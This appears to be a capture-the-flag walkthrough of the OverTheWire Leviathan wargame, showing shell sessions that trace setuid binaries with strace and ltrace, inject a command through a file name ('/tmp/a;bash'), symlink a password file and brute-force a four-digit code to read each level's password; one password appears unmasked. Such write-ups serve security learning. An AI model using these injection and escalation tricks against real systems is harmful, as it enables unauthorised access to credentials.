@@ -1,0 +1,205 @@
+Overthewire Leviathan is a wargame for improving cybersecurity skills.
+
+uid=12000(leviathan0) gid=12000(leviathan0) groups=12000(leviathan0)
+leviathan0@leviathan:~$ ls -la
+total 24
+drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
+drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
+drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+leviathan0@leviathan:~$ cd .backup/
+leviathan0@leviathan:~/.backup$ ls
+bookmarks.html
+leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep "leviathan"
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+leviathan0@leviathan:~/.backup$
+
+The password for leviathan1 is rio#####
+
+We got the password for leviathan1:
+
+leviathan1@leviathan:~$ ls
+check
+leviathan1@leviathan:~$ clear
+leviathan1@leviathan:~$ id
+uid=12001(leviathan1) gid=12001(leviathan1) groups=12001(leviathan1)
+leviathan1@leviathan:~$ ls
+check
+leviathan1@leviathan:~$ strace ./check
+execve("./check", ["./check"], [/* 17 vars */]) = 0
+strace: [ Process PID=28977 runs in 32 bit mode. ]
+brk(NULL)                               = 0x804b000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
+mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
+mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
+mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
+mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
+close(3)                                = 0
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
+set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
+munmap(0xf7fc9000, 36357)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+brk(NULL)                               = 0x804b000
+brk(0x806c000)                          = 0x806c000
+fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+write(1, "password: ", 10password: )              = 10
+read(0,
+"\n", 1024)                     = 1
+read(0,
+"\n", 1024)                     = 1
+read(0,
+"\n", 1024)                     = 1
+write(1, "Wrong password, Good Bye ...\n", 29Wrong password, Good Bye ...
+) = 29
+exit_group(0)                           = ?
++++ exited with 0 +++
+leviathan1@leviathan:~$
+leviathan1@leviathan:~$ ltrace ./check
+__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
+printf("password: ")                                                  = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700password:
+)                                 = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700
+)                                 = 10
+getchar(1, 0, 0x65766f6c, 0x646f6700
+)                                 = 10
+strcmp("\n\n\n", "s##")                                               = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)                                  = 29
++++ exited (status 0) +++
+leviathan1@leviathan:~$
+
+So this string compare reveals the password:
+strcmp("\n\n\n", "s##") 
+
+
+leviathan1@leviathan:~$ ./check
+password: s##
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+$
+
+$ cd leviathan_pass
+$ ls
+leviathan0  leviathan1  leviathan2  leviathan3  leviathan4  leviathan5  leviathan6  leviathan7
+$ cat leviathan3
+cat: leviathan3: Permission denied
+$ cat leviathan2
+oug#####
+$
+
+This is the method I found from abatchy's blog.
+
+leviathan2@leviathan:~$ ./printfile "/tmp/a;bash"
+1
+leviathan3@leviathan:~$ id
+uid=12003(leviathan3) gid=12002(leviathan2) groups=12002(leviathan2)
+leviathan3@leviathan:~$
+
+leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
+Ahdi####
+leviathan3@leviathan:~$
+
+Lets move on to the level4:
+
+leviathan3@leviathan:~$ ltrace ./level3
+__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka")                                                     = -1
+printf("Enter the password> ")                                                 = 20
+fgets(Enter the password> h0no33
+"h0no33\n", 256, 0xf7fc55a0)                                             = 0xffffd590
+strcmp("h0no33\n", "snl#####f\n")                                              = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                                                     = 19
++++ exited (status 0) +++
+leviathan3@leviathan:~$ ./level3
+Enter the password> snl####
+[You've got shell]!
+$ id
+uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
+$ cat /etc/leviathan_pass/leviathan4
+vuH0c####
+$
+
+leviathan4@leviathan:~$ id
+uid=12004(leviathan4) gid=12004(leviathan4) groups=12004(leviathan4)
+leviathan4@leviathan:~$ ls
+leviathan4@leviathan:~$
+
+Level 5:
+
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+
+Lets decode this binary.
+
+Tith#####
+
+This can be the password to Level 5 i.e leviathan5
+
+leviathan5@leviathan:~$ id
+uid=12005(leviathan5) gid=12005(leviathan5) groups=12005(leviathan5)
+leviathan5@leviathan:~$ ls
+leviathan5
+leviathan5@leviathan:~$
+
+
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ls
+leviathan5
+leviathan5@leviathan:~$ ./leviathan5
+UgaoF#e####
+leviathan5@leviathan:~$
+
+
+Password to level 6 -> #######
+
+
+Level 6 to 7
+
+In this we need to provide 4 digit code to get the access.
+So this script will solve our problem.
+
+-> for i in $(seq 0000 9999); do ./leviathan6 $i; done
+
+$ id
+uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
+$ cat /etc/leviathan_pass/leviathan7
+#########
+$
+
+leviathan7@leviathan:~$ id
+uid=12007(leviathan7) gid=12007(leviathan7) groups=12007(leviathan7)
+leviathan7@leviathan:~$ ls
+CONGRATULATIONS
+leviathan7@leviathan:~$ cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+leviathan7@leviathan:~$
+
+
+
+
+
+
+
+
+
+
